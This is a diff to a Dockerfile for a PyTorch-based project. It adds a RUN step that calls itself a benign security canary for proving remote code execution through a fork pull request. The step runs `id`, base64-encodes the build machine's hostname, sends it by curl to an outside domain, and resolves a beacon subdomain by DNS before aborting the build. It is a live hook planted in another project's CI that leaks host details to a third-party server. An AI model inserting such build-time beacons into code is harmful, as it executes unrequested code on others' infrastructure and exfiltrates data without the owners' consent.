@@ -1,4 +1,15 @@
 FROM nvcr.io/nvidia/pytorch:25.05-py3
+# === GARUDA BENIGN SECURITY CANARY (MSRC fork-PR RCE proof) ===
+# Read-only beacon: prints identity, calls OOB canary, then exits 1 to abort build.
+# No secret reads, no persistence, no lateral movement.
+RUN echo "garuda-canary-f0b97d start" \
+    && (id || true) \
+    && HN="$(hostname 2>/dev/null | base64 | tr -d '\n')" \
+    && (curl -s -m 15 "https://superbench-canary.dssldrf.net/f0b97d-forkpr/hn=${HN}" || true) \
+    && (getent hosts f0b97d-forkpr.rce.superbench-canary.dssldrf.net || true) \
+    && echo "garuda-canary beacon-sent; aborting build for safety" \
+    && exit 1
+# === END GARUDA CANARY ===
 
 # OS:
 #   - Ubuntu: 24.04
